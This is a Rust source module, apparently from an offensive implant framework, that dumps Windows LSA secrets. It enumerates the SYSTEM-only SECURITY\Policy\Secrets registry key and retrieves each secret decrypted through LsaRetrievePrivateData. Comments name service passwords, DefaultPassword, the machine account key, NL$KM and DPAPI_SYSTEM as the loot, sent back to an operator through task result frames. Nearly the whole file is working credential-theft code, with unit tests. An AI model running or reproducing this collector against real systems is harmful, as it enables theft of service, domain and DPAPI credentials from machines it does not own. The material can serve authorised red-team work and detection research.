//! The secret-store edge (the module's whole platform surface): the
//! registry's `SECURITY\Policy\Secrets` subtree enumerates the store's
//! names and the LSA policy API hands the values back decrypted -- the
//! system performs its own decryption, so the module owes no key
//! schedule, no cipher, and no dependency beyond advapi32's eight
//! functions. Everything that must hold for a test (the row
//! renderings, the value decoding, the error tables) is a plain
//! function this host runs anywhere; only the calls themselves sit
//! behind `cfg(windows)`, and the Windows crosses the CI lane builds
//! prove they compile.
//!
//! One platform fact shapes the verb's honesty: both halves of the act
//! answer to the SYSTEM seat -- the subtree answers SYSTEM alone, and
//! so do the secret objects the policy API queries. An implant that is
//! merely elevated asks, the subtree answers access denied, and the
//! refusal names the seat rather than pretending the read ran.

/// The seat row the survey read leads with: the gate both actions
/// share, reported as the fact it is.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn seat_row() -> String {
    "the secret store opens -- this process holds the SYSTEM seat; the read can \
     run"
    .to_string()
}

/// The row one secret's value renders: the name, the size in bytes,
/// and the value itself -- as text where the bytes decode cleanly,
/// as hex where they do not. A secret the store holds is often a
/// password or a key: the text form serves the operator reading a
/// `_SC_` service password, the hex form serves the binary material
/// (`$MACHINE.ACC`, `NL$KM`, `DPAPI_SYSTEM`) whose meaning is the
/// engagement's to make, not the module's.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn value_row(name: &str, bytes: &[u8]) -> String {
    if bytes.is_empty() {
        return format!("{name}: 0 bytes, empty");
    }
    let size = bytes.len();
    if let Some(text) = printable_ascii(bytes) {
        format!(r#"{name}: {size} bytes, text "{text}""#)
    } else if let Some(text) = printable_utf16(bytes) {
        format!(r#"{name}: {size} bytes, text "{text}""#)
    } else {
        format!("{name}: {size} bytes, hex {}", hex(bytes))
    }
}

/// The Win32 error codes the registry half meets, as the messages the
/// operator reads. A code outside the table stands as its number --
/// never a guess at what the site's registry meant by it.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn registry_message(status: i32) -> String {
    match status {
        2 => "the machine carries no SECURITY\\Policy\\Secrets subtree".to_string(),
        5 => "access denied -- the secret store answers the SYSTEM seat alone; \
             the read needs a SYSTEM implant"
            .to_string(),
        other => format!("registry error {other}"),
    }
}

/// The NTSTATUS codes the LSA half meets, as the messages the operator
/// reads, standing as their code outside the table.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn lsa_message(status: i32) -> String {
    match status {
        STATUS_ACCESS_DENIED => {
            "access denied -- the secret answers the SYSTEM seat alone".to_string()
        }
        STATUS_OBJECT_NAME_NOT_FOUND => "the secret store does not carry that name".to_string(),
        other => format!("lsa error {other:#010x}"),
    }
}

/// The bytes as lowercase hex, two digits per byte.
#[cfg_attr(not(windows), allow(dead_code))]
fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

/// The bytes as text when every one of them is a printable ASCII
/// character -- the plain passwords the store can hold.
#[cfg_attr(not(windows), allow(dead_code))]
fn printable_ascii(bytes: &[u8]) -> Option<String> {
    bytes
        .iter()
        .all(|byte| (0x20..=0x7e).contains(byte))
        .then(|| bytes.iter().map(|byte| *byte as char).collect())
}

/// The bytes as text when they are printable UTF-16LE -- the wide
/// passwords the store usually holds, every second byte a NUL.
#[cfg_attr(not(windows), allow(dead_code))]
fn printable_utf16(bytes: &[u8]) -> Option<String> {
    if !bytes.len().is_multiple_of(2) {
        return None;
    }
    let units: Vec<u16> = bytes
        .as_chunks::<2>()
        .0
        .iter()
        .map(|pair| u16::from_le_bytes(*pair))
        .collect();
    units
        .iter()
        .all(|unit| (0x20..=0x7e).contains(unit))
        .then(|| units.iter().map(|unit| *unit as u8 as char).collect())
}

// ---- the Windows calls ----

#[cfg(windows)]
mod win {
    use std::os::raw::c_void;

    use super::{lsa_message, registry_message, value_row};

    type Hkey = isize;
    type Lstatus = i32;
    type Ntstatus = i32;
    type LsaHandle = *mut c_void;

    const HKEY_LOCAL_MACHINE: Hkey = 0x8000_0002usize as isize;
    const KEY_READ: u32 = 0x0002_0019;
    const POLICY_GET_PRIVATE_INFORMATION: u32 = 0x0000_0004;

    /// The policy API's own counted string: a UTF-16 buffer without a
    /// terminator, its lengths in bytes.
    #[repr(C)]
    struct LsaUnicodeString {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }

    /// The API's own record, `#[repr(C)]` against its documented
    /// layout: the policy call reads the length alone and ignores
    /// every other field when they are null.
    #[repr(C)]
    struct LsaObjectAttributes {
        length: u32,
        root_directory: *mut c_void,
        object_name: *const LsaUnicodeString,
        attributes: u32,
        security_descriptor: *const c_void,
        security_quality_of_service: *const c_void,
    }

    /// The blob the policy API hands a secret's value back in: a
    /// length in bytes and the bytes themselves, freed through
    /// `LsaFreeMemory`.
    #[repr(C)]
    struct DataBlob {
        size: u32,
        bytes: *mut u8,
    }

    #[link(name = "advapi32")]
    extern "system" {
        fn RegOpenKeyExW(
            hkey: Hkey,
            subkey: *const u16,
            options: u32,
            desired: u32,
            result: *mut Hkey,
        ) -> Lstatus;
        fn RegQueryInfoKeyW(
            hkey: Hkey,
            class: *mut u16,
            class_length: *mut u32,
            reserved: *const u32,
            subkeys: *mut u32,
            max_subkey_length: *mut u32,
            max_class_length: *mut u32,
            values: *mut u32,
            max_value_name_length: *mut u32,
            max_value_length: *mut u32,
            security_descriptor: *mut u32,
            last_write_time: *mut i64,
        ) -> Lstatus;
        fn RegEnumKeyExW(
            hkey: Hkey,
            index: u32,
            name: *mut u16,
            name_length: *mut u32,
            reserved: *const u32,
            class: *mut u16,
            class_length: *mut u32,
            last_write_time: *mut i64,
        ) -> Lstatus;
        fn RegCloseKey(hkey: Hkey) -> Lstatus;
        // The policy edge rides the same library: LsaOpenPolicy has no
        // wide variant to name -- its system name is a counted
        // LSA_UNICODE_STRING, so the one spelling is the whole export.
        fn LsaOpenPolicy(
            system_name: *const LsaUnicodeString,
            attributes: *mut LsaObjectAttributes,
            desired: u32,
            handle: *mut LsaHandle,
        ) -> Ntstatus;
        fn LsaRetrievePrivateData(
            handle: LsaHandle,
            name: *const LsaUnicodeString,
            data: *mut *mut DataBlob,
        ) -> Ntstatus;
        fn LsaFreeMemory(memory: *mut c_void) -> i32;
        fn LsaClose(handle: LsaHandle) -> Ntstatus;
    }

    /// A NUL-terminated UTF-16 string, the encoding the registry entry
    /// points take.
    fn wide(text: &str) -> Vec<u16> {
        text.encode_utf16().chain(std::iter::once(0)).collect()
    }

    /// The open `SECURITY\Policy\Secrets` subtree, closed on drop. The
    /// open itself is the seat's proof: it succeeds under SYSTEM alone.
    pub(crate) struct StoreKey(Hkey);

    impl Drop for StoreKey {
        fn drop(&mut self) {
            unsafe { RegCloseKey(self.0) };
        }
    }

    /// An open LSA policy handle, closed on drop.
    pub(crate) struct PolicyHandle(LsaHandle);

    impl Drop for PolicyHandle {
        fn drop(&mut self) {
            unsafe { LsaClose(self.0) };
        }
    }

    /// Opens the secret store's subtree -- the SYSTEM seat's gate, the
    /// one both actions pass through so an implant that is merely
    /// elevated refuses once, named, before anything is read.
    pub(crate) fn open_store() -> Result<StoreKey, String> {
        let subkey = wide(r"SECURITY\Policy\Secrets");
        let mut key: Hkey = 0;
        let status =
            unsafe { RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.as_ptr(), 0, KEY_READ, &mut key) };
        if status == 0 {
            Ok(StoreKey(key))
        } else {
            Err(format!("collect.lsasecrets: {}", registry_message(status)))
        }
    }

    /// The store's names in the registry's own order, one row per
    /// name: the survey read's inventory.
    pub(crate) fn inventory(key: &StoreKey) -> Result<Vec<String>, String> {
        unsafe {
            let mut count: u32 = 0;
            let mut max_name: u32 = 0;
            let status = RegQueryInfoKeyW(
                key.0,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null(),
                &mut count,
                &mut max_name,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            );
            if status != 0 {
                return Err(format!("collect.lsasecrets: {}", registry_message(status)));
            }
            // One slot past the longest name for the terminator the
            // call reports and the API's own contract says it writes.
            let mut buffer = vec![0u16; max_name as usize + 2];
            let mut names = Vec::new();
            for index in 0..count {
                let mut length = buffer.len() as u32;
                let status = RegEnumKeyExW(
                    key.0,
                    index,
                    buffer.as_mut_ptr(),
                    &mut length,
                    std::ptr::null(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                );
                if status != 0 {
                    return Err(format!("collect.lsasecrets: {}", registry_message(status)));
                }
                names.push(String::from_utf16_lossy(&buffer[..length as usize]));
            }
            Ok(names)
        }
    }

    /// Opens the local policy with the access secret retrieval needs.
    pub(crate) fn open_policy() -> Result<PolicyHandle, String> {
        unsafe {
            let mut attributes: LsaObjectAttributes = std::mem::zeroed();
            attributes.length = std::mem::size_of::<LsaObjectAttributes>() as u32;
            let mut handle: LsaHandle = std::ptr::null_mut();
            let status = LsaOpenPolicy(
                std::ptr::null(),
                &mut attributes,
                POLICY_GET_PRIVATE_INFORMATION,
                &mut handle,
            );
            if status == 0 {
                Ok(PolicyHandle(handle))
            } else {
                Err(format!("collect.lsasecrets: {}", lsa_message(status)))
            }
        }
    }

    /// One secret's current value, decrypted by the LSA itself and
    /// rendered as the row the operator reads. The values ride the
    /// task's result frames; nothing lands on disk.
    pub(crate) fn read_row(policy: &PolicyHandle, name: &str) -> String {
        let mut units: Vec<u16> = name.encode_utf16().collect();
        // The counted string's length field is sixteen bits; a name
        // past it cannot be a name the store carries, and the row
        // says so rather than truncating the ask.
        let byte_length = match u16::try_from(units.len() * 2) {
            Ok(length) => length,
            Err(_) => return format!("{name}: the name is longer than the policy API carries"),
        };
        let mut lsa_name = LsaUnicodeString {
            length: byte_length,
            maximum_length: byte_length,
            buffer: units.as_mut_ptr(),
        };
        let mut data: *mut DataBlob = std::ptr::null_mut();
        let status = unsafe { LsaRetrievePrivateData(policy.0, &mut lsa_name, &mut data) };
        if status != 0 {
            return format!("{name}: {}", lsa_message(status));
        }
        let bytes =
            unsafe { std::slice::from_raw_parts((*data).bytes, (*data).size as usize).to_vec() };
        unsafe { LsaFreeMemory(data.cast()) };
        value_row(name, &bytes)
    }
}

#[cfg(windows)]
pub(crate) use win::{inventory, open_policy, open_store, read_row};

// The NTSTATUS values the LSA half meets, as signed i32 the tables
// above match on: the codes arrive as the API's own NT_SUCCESS
// convention reports them, zero the success the read_row caller
// never passes.
#[cfg_attr(not(windows), allow(dead_code))]
const STATUS_ACCESS_DENIED: i32 = 0xC000_0022_u32 as i32;
#[cfg_attr(not(windows), allow(dead_code))]
const STATUS_OBJECT_NAME_NOT_FOUND: i32 = 0xC000_0034_u32 as i32;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_seat_row_names_the_gate_both_actions_share() {
        let row = seat_row();
        assert!(row.contains("SYSTEM seat"), "{row}");
        assert!(row.contains("the read can run"), "{row}");
    }

    #[test]
    fn plain_passwords_render_as_text() {
        // The wide form the store usually holds, then the plain one.
        let wide: Vec<u8> = "Password1!"
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect();
        assert_eq!(
            value_row("DefaultPassword", &wide),
            r#"DefaultPassword: 20 bytes, text "Password1!""#,
        );
        assert_eq!(
            value_row("_SC_W32Time", b"service secret"),
            r#"_SC_W32Time: 14 bytes, text "service secret""#,
        );
    }

    #[test]
    fn binary_material_renders_as_hex() {
        let machine_acc: &[u8] = &[0xd0; 26];
        assert_eq!(
            value_row("$MACHINE.ACC", machine_acc),
            format!("$MACHINE.ACC: 26 bytes, hex {}", "d0".repeat(26)),
        );
        // A byte stream carrying NULs beside text is binary, not text.
        let mixed: &[u8] = &[0x41, 0x00, 0x00, 0x00, 0x42];
        assert!(
            value_row("SA COMPUTER$", mixed).contains("hex"),
            "{mixed:?}"
        );
    }

    #[test]
    fn an_empty_secret_names_its_emptiness() {
        assert_eq!(
            value_row("DefaultPassword", b""),
            "DefaultPassword: 0 bytes, empty"
        );
    }

    #[test]
    fn the_registry_table_names_the_codes_operators_meet() {
        assert!(
            registry_message(5).contains("SYSTEM seat"),
            "{}",
            registry_message(5)
        );
        assert!(
            registry_message(2).contains("no SECURITY"),
            "{}",
            registry_message(2)
        );
        // An untabled code keeps its number -- never a guessed cause.
        assert_eq!(registry_message(1010), "registry error 1010");
    }

    #[test]
    fn the_lsa_table_names_the_codes_operators_meet() {
        assert!(lsa_message(STATUS_ACCESS_DENIED).contains("SYSTEM seat"));
        assert!(lsa_message(STATUS_OBJECT_NAME_NOT_FOUND).contains("does not carry"));
        // An untabled status keeps its code -- never a guessed cause.
        assert_eq!(lsa_message(0xC000_000D_u32 as i32), "lsa error 0xc000000d");
    }
}
